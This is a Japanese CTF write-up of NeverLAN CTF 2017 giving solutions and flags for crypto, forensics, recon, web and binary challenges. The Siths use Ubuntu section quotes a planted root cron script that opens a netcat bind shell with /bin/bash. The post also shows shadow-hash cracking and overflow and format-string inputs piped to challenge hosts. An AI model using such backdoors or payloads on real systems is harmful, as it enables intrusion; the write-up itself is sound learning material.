---
layout: post
title: NeverLAN CTF 2017 の write-up
categories: [ctf]
date: 2017-02-27 19:30:00 +0900
---

Hirota Sora としてひとりで [NeverLAN CTF 2017](https://neverlanctf.com/) に参加しました。最終的に 35 問を解いて 5125 点を獲得し、順位は 6 位 (得点 141 チーム中) でした。

以下、解いた問題の write-up です。

## Crypto

### TheHistoryOfCryptography (100)

暗号に関するクイズでした。

> This Shifty Cipher is one of the simplest, and most well know ciphers.

`caesar`

> This Cipher is is named after the person who made it famous, not but the man who first created it.

`vigenere`

> This transposition cipher was used by the warriors in the famous movie "the 300"

`scytale`

> The first recorded use of this cipher was used to hide a book of magic.

`steganography`

> This world famous cipher was invented by Arthur Scherbius

`enigma machine`

```
THEHISTORYOFCRYPTOGRAPHYISAW3S0M3
```

### Frenchy (100)

問題文から鍵は `NEVERLANCTF` とわかっています。ヴィジュネル暗号で `spvk{KSRRGAZAHMIUJENTLYBGMETVTUGONTMZRVCE}` を復号するとフラグが出てきました。

```
THREEHUNDREDYEARSTOCRACKTHEVIGIENERE
```

### KnightsTale (200)

いろいろググっていると [Pigpen cipher - Wikipedia](https://en.wikipedia.org/wiki/Pigpen_cipher#Variants) が見つかりました。これを使って読むと

```
FLAGSYMBOLSCANBE
USEDFORCRYPTOGRA
PHYTOO
```

と書かれているとわかります。

```
SYMBOLSCANBEUSEDFORCRYPTOGRAPHYTOO
```

### MasterDecoder (200)

7 回 Base64 でデコードしましょう。

```python
s
'Vm0xd1NtUXlWa1pPVldoVFlUSlNjRlJVVGtOalZsSlZVbTVrVldKR1NsZFdWM2hyWVdzeFdWRnJiRlZXYkhCeVdXdGFZV014VG5KYVJscHBWMFV3ZUZacVJsWmxSa3BYVm01R1dHSklRbk5aV0hCWFZsWmtjMXBFVW1saVZrWXpWRlpXYzFsV1NYcFJiVGxhVjBoQ1dGcEZXbUZrUjFKSVpFZHNUbUV4Y0VwV1ZFa3hWREZXUjFkc2JGWmlhM0JZVkZWYVZtUXhjRVZTYlhSVFZtdGFlRlpITVRCVWJFcEdWMnQwVjFadFVqTlhWbHByVmpGT2RWWnRSbXhpUmxVMQ=='
for _ in range(7):
  s = s.decode('base64')
print s
```

```
//NeverLAN_N3sts_M0r3_Than_Just_L00pz\\
```

### BabyRSA (400)

[NeverLAN-CTF/r00tz_babyRSA at challenge](https://github.com/NeverLAN-CTF/r00tz_babyRSA/tree/challenge) を読んでいると

```
	/**
	  * You have stolen the following ciphertext:
	  * 63 12471 17384 19150 3861 17806 15090 5270
	  *
	  * This was encrypted using an RSA key with the following public key:
	  * n = 19153
	  * e = 17
	  *
	  * Break the key and decrypt the ciphertext to get the flag.
	  *
	  * You will need to write some code! When you think you're ready,
	  * uncomment the last two lines before the closing }.
	  */
```

とありました。19153 を素因数分解して、あとは復号するだけです。

```python
import gmpy
p, q = 107, 179
n = p * q
e = 17
d = gmpy.invert(e, (p - 1) * (q - 1))
cs = [63, 12471, 17384, 19150, 3861, 17806, 15090, 5270]
res = ''
for c in cs:
  res += chr(pow(c, d, n))
print res
```

```
harmonic
```

## Forensics

### SoYouLikeMusic (50)

jad に投げてデコンパイルすると、

```java
System.out.println("Congratulations!! You did it!!");
System.out.println("ZmxhZ3tTdGlsbF9XYWl0aW5nX09uX3B1cnZlc3RhJ3NfTWl4dGFwZX0=");
```

という部分がありました。Base64 でデコードするとフラグが出てきました。

```
Still_Waiting_On_purvesta's_Mixtape
```

### Not Star Trek (150)

[root]/!embers.png にフラグがありました。

```
you_found_the_rebel_alliance
```

### just-a-selfie (300)

まずは与えられたメールのテキストから画像ファイルを取り出しましょう。

```python
s = ''.join(open('s.txt').read().splitlines())
open('a.jpg', 'wb').write(s.decode('base64'))
```

binwalk に投げると、

```
$ binwalk a.jpg
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, JFIF standard 1.01
30            0x1E            TIFF image data, big-endian, offset of first image directory: 8
128969        0x1F7C9         Zip archive data, at least v2.0 to extract, name: Death_Star_Owner's_Technical_Manual_blueprints.jpg
712883        0xAE0B3         Zip archive data, at least v1.0 to extract, name: __MACOSX/
712938        0xAE0EA         Zip archive data, at least v2.0 to extract, name: __MACOSX/._Death_Star_Owner's_Technical_Manual_blueprints.jpg
713908        0xAE4B4         End of Zip archive, footer length: 22
```

とファイルの後ろに zip がくっついているとわかります。

```python
s = open('a.jpg', 'rb').read()
open('a.zip', 'wb').write(s[0x1f7c9:])
```

展開するとフラグが書かれた画像が出てきました。

```
rebellions_are_built_on_hope
```

### Siths use Ubuntu (1 of 3) (125)

`/etc/crontab` を見ると

```
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*/5 *   * * *   root    /etc/init.d/rebels
```

とあります。`/etc/init.d/rebels` を見てみましょう。

```
#!/bin/bash
# The F | L | A | G is: kylo_ren_undercover_boss
if (( `/bin/ps aux | /bin/grep /bin/nc | /usr/bin/wc -l` == 1 )); then /bin/nc.traditional -l -p 443 -e /bin/bash; fi
```

```
kylo_ren_undercover_boss
```

### Siths use Ubuntu (2 of 3) (175)

`/etc/shadow.backup` を見ると以前のパスワードは `$6$7BjdgYNF$ilxLuuktH8ZNQqaAaIQPHevTvkhGZ5Qj5iZB28jaeTMx9KBqaF1rvALIK0TAcKCC3kkI/Wl4cu8OYHNxMXVmd0` であるとわかります。

あとは John the Ripper に投げるとフラグが出てきました。

```
starwars
```

### Siths use Ubuntu (3 of 3) (175)

`/var/log/auth.log` を見ると

```
Good Job! It looks like it was brute forced. Your an sw er is: should-have-used-fail2ban
```

とありました。

```
should-have-used-fail2ban
```

## Recon

### NeverLAN (50)

[https://twitter.com/NeverLanCTF/status/834992893978804224](https://twitter.com/NeverLanCTF/status/834992893978804224) にフラグがありました。

```
inf0rmation_is_p0wer_kn0w_y0ur_adversary
```

### Viking (100)

[http://idahotech.community/index.php/users](http://idahotech.community/index.php/users) にフラグがありました。

```
hey_look_you_found_me
```

### Purvesta (100)

[@purvesta0704](https://twitter.com/purvesta0704) さんの bio にフラグがありました。

```
W0w_y0u_Ar3_Getting_g00d_at_Thi5
```

### Neo (100)

`Zane Durkin` でググると https://www.linkedin.com/in/zane-durkin-6067ba125 がヒットしました。

```
784fee9b28b21cd14483bee1cb656253
```

### Zesty (100)

`Google+ preston pace` でググると https://plus.google.com/108112355831246806673 がヒットしました。

```
c7b32ee774758f838d378859e1eae85c
```

### Neo2 (200)

[https://www.neverlanctf.com/Zane](https://www.neverlanctf.com/Zane) のソースを見ると

```
<form method="post" action="ZD.php">
    <input type="submit" name="submit" value="submit" class="small" style="position:fixed;bottom:0;right:0;"/>
    <input type="hidden" name="riddle" maxlength="3" minlength="3" value=""/><!-- type: text; riddle: To grow your mental perception and increase your cognizance.  Never let him stop growing. Never let him die; -->
</form>
```

とあります。`"mental perception" "cognizance"` でググると `ken` がヒットしました。

`curl https://www.neverlanctf.com/ZD.php -d "riddle=ken"` でフラグが表示されました。

```
da7_k3n_d0h
```

### NoCTFWithoutMusic (200)

https://open.spotify.com/user/purvesta/playlist/51N0NM6gTJbk8oUvLcthRX

曲の頭文字をつなげるとフラグが出てきました。

```
DEEPERDOWNTHERABBITHOLE
```

## Other

### Master Mind 1 (50)

```
| 7 | 3 | 6 | One number is correct but wrongly placed
| 0 | 6 | 5 | One number is correct and correctly placed
| 3 | 7 | 2 | Two numbers are correct but wrongly placed
| 6 | 4 | 7 | No numbers are correct
| 5 | 2 | 4 | One number is correct and correctly placed
```

```
023
```

### Master Mind 2 (100)

```
| 9 | 5 | 3 | 2 | One number is correct but wrongly placed
| 1 | 6 | 7 | 3 | Two numbers are correct and correctly placed
| 0 | 6 | 5 | 9 | Two numbers are correct but wrongly placed
| 2 | 4 | 3 | 8 | No numbers are correct
| 5 | 2 | 4 | 0 | One number is correct and correctly placed
```

めんどくさいので総当りしちゃいましょう。

```python
def count(s, ans):
  a, b = 0, 0
  for k in range(4):
    if s[k] in ans:
      a += 1
    if s[k] == ans[k]:
      b += 1
  return a, b

def check(s):
  if count(s, '9532') != (1, 0):
    return False
  if count(s, '1673') != (2, 2):
    return False
  if count(s, '0659') != (2, 0):
    return False
  if count(s, '2438') != (0, 0):
    return False
  if count(s, '5240') != (1, 1):
    return False
  return True

for x in range(10000):
  x = str(x).zfill(4)
  if check(x):
    print x
```

```
1970
```

### speech-to-text (150)

Audacity で 4 倍速 + 逆再生するとフラグが聞こえてきました。

```
7ex7_70_5p33ch
```

### TheNumbers_WhatDoTheyMean? (100)

file に投げると、与えられたファイルは JPEG とわかります。

```
jpeg_png_jpg_ico_svg_etc
```

### CrackThePass (150)

[CrackStation](https://crackstation.net/) に ac0a96e036d11092712ef57f59ff9c7cb81fd909 を投げると出てきました。

```
iluvrebels
```

## Binary

### ThisIsTheEnd (300)

`python -c "import sys; print 'A' * 4096" | nc neverlanctf-challenges-elb-248020705.us-west-2.elb.amazonaws.com 1235`

```
this_is_the_end_my_only_friend_\0
```

### FormatMyWorld (350)

`python -c "print 'A' * 4096 + '%s'" | nc neverlanctf-challenges-elb-248020705.us-west-2.elb.amazonaws.com 6745`

```
flagflagflag
```

## Web

### CookieMonster (50)

`curl http://neverlanctf-challenges-elb-248020705.us-west-2.elb.amazonaws.com:8401/ -b "Yellow_Guy's_name=Big Bird"` でフラグが表示されました。

```
bigest_of_the_birds
```

### A Slight Cut (100)

`curl http://neverlanctf-challenges-elb-248020705.us-west-2.elb.amazonaws.com:9123/echo.php?length=1000&text=a` でフラグが表示されました。

```
bleeding_in_javascript
```

### No Humans Allowed (200)

表示された式の答えを 1 秒以内に送信する問題でした。

```javascript
document.getElementsByName('val3')[0].value = eval(document.querySelectorAll('p')[1].textContent);
document.querySelector('form').submit();
```

```
jHBhbfoY1UEHQuRMwzt7Yr8xkCiCvfbS
```

### Working For the Rebels Now (200)

http://ec2-52-42-62-163.us-west-2.compute.amazonaws.com/wp-json/wp/v2/posts/1 にアクセスするとフラグが表示されました。

```
vader_should_have_updated_wordpress
```

### WebCipher (300)

シーザー暗号でいくつかシフトされた文字列が表示されます。[Caesar Cipher](https://st98.github.io/sandbox/caesar/) でいじっているとそれっぽい単語が出てくるので、これを投げるとフラグが表示されました。

```
c34s3r_c1ph3r_70_7h3_m4x
```

## Trivia

### Encoding Apprentice (50)

> What common encoding practice’s title contains the square of 8 and occasionally ends with an “=”, or “==”?

```
base64
```

### Shifty Ciphers… (50)

> What cipher is the shiftiest of them all? He even has his own salad…

```
caesar
```

### Know your extensions (50)

> Unix and Linux use this (instead of a file extension) to determine what format a file is.

```
magic numbers
```

### Mmmm... SSL (50)

> What is the standard, secure, size of an ssl certificate?

```
2048
```

### Don't eat me (50)

> I allow HTTP to act as a stateful protocol instead of the stateless protocol it actually is. Just a small piece of data sent from a website...

```
cookie
```
